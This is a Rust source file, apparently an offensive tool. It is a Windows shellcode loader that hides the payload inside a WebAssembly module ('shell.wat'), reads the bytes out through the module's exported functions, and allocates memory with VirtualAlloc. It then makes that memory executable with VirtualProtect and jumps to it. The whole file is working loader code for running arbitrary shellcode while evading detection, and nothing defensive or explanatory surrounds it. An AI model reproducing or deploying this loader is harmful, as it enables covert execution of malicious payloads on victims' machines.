use std::{
    fs,
    ptr::{copy, null_mut},
};
use wasmtime::{self, Engine, Error, Instance, Module, Store};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};

fn main() -> Result<(), Error> {
    let engine = Engine::default();
    let mut store = Store::new(&engine, ());
    let wasm_binary = fs::read("shell.wat")?; // Webassembly file containing the shellcode
    let module = Module::new(&engine, &wasm_binary)?;
    let instance = Instance::new(&mut store, &module, &[])?;
    let get_wasm_mem_size = instance.get_func(&mut store, "get_wasm_mem_size").expect("Not found get_wasm_mem_size");
    let read_wasm_at_index = instance.get_func(&mut store, "read_wasm_at_index").expect("Not found read_wasm_at_index");
    let read_wasm_at_index = read_wasm_at_index.typed::<u32, u32>(&store)?;
    let get_wasm_mem_size = get_wasm_mem_size.typed::<(), u32>(&store)?;
    let buffer_size: u32 = get_wasm_mem_size.call(&mut store, ())?;
    let mut shellcode_buffer: Vec<u8> = vec![0; buffer_size as usize];

    for i in 0..buffer_size {
        let value = read_wasm_at_index.call(&mut store, i)?;
        shellcode_buffer[i as usize] = value as u8;
    }

    unsafe {
        println!("[+] Memory Allocation Being Performed");
        let shellcode_addr = VirtualAlloc(
            Some(null_mut()),
            shellcode_buffer.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        println!("[+] Copying a Shellcode To Target Memory");
        copy(
            shellcode_buffer.as_ptr() as _,
            shellcode_addr,
            shellcode_buffer.len(),
        );

        println!("[+] Changing Page Permissions");
        let mut old_protection: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            shellcode_addr,
            shellcode_buffer.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        ).unwrap_or_else(|e| {
            panic!("[!] VirtualProtect Failed With Error: {e}");
        });

        let func: fn() = std::mem::transmute(shellcode_addr);
        func()
    }

    Ok(())
}
